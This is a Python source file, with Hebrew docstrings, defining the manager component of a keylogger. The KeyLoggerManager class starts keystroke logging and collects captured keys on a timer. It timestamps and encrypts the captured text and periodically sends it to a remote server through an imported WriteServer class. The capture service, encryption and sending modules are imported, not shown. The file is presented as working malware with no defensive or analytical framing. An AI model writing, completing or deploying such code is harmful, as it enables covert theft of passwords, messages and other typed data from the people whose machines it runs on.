import threading
import time
from datetime import datetime

from keyloggerservice import KeyLoggerService
from encryption import Encryption
from writeserver import WriteServer


class KeyLoggerManager:
    def __init__(self, encryption: Encryption, writer: WriteServer, key: str,
                 collect_interval=5, flush_interval=30):
        """
        :param encryption: מופע של מחלקת הצפנה
        :param writer: מופע של מחלקת שליחה לשרת
        :param key: מפתח הצפנה
        :param collect_interval: זמן (שניות) בין איסופים
        :param flush_interval: זמן (שניות) בין שליחות לשרת
        """
        self.key_logger_service = KeyLoggerService()
        self.encryption = encryption
        self.writer = writer
        self.key = key

        self.collect_interval = collect_interval
        self.flush_interval = flush_interval

        self.buffer = []
        self.running = False
        self.lock = threading.Lock()

        self.collect_thread = None
        self.flush_thread = None

    def start(self):
        if self.running:
            return
        self.running = True
        self.key_logger_service.start_logging()

        self.collect_thread = threading.Thread(target=self._collector, daemon=True)
        self.collect_thread.start()

        self.flush_thread = threading.Thread(target=self._flusher, daemon=True)
        self.flush_thread.start()

        print("KeyLoggerManager started!")

    def stop(self):
        self.running = False
        if self.collect_thread:
            self.collect_thread.join()
        if self.flush_thread:
            self.flush_thread.join()
        self.key_logger_service.stop_logging()
        self.flush()
        print("KeyLoggerManager stopped!")

    def add_data(self, data: str):
        timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        line = f"{timestamp} - {data}"
        with self.lock:
            self.buffer.append(line)

    def _collector(self):
        while self.running:
            data = self.key_logger_service.get_logged_keys()
            if data:
                self.add_data(data)
            time.sleep(self.collect_interval)

    def _flusher(self):
        while self.running:
            time.sleep(self.flush_interval)
            self.flush()

    def flush(self):
        with self.lock:
            if not self.buffer:
                return
            joined_data = "\n".join(self.buffer) + "\n"
            encrypted = self.encryption.encrypt(joined_data, self.key)
            self.writer.send_data(encrypted, "machine")
            self.buffer = []
